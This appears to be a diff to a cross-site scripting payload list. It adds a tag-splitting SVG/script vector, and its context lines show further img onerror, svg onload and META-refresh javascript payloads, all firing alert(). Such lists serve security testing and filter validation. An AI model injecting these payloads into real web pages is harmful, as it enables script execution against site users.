@@ -1,5 +1,6 @@
 <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script>
 /(A(%22onerror='alert%601%60'testabcd))/
+<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
 "/><img src=xss onerror=alert(1)><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 PL"><svg/onload=alert("XSS")><"
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
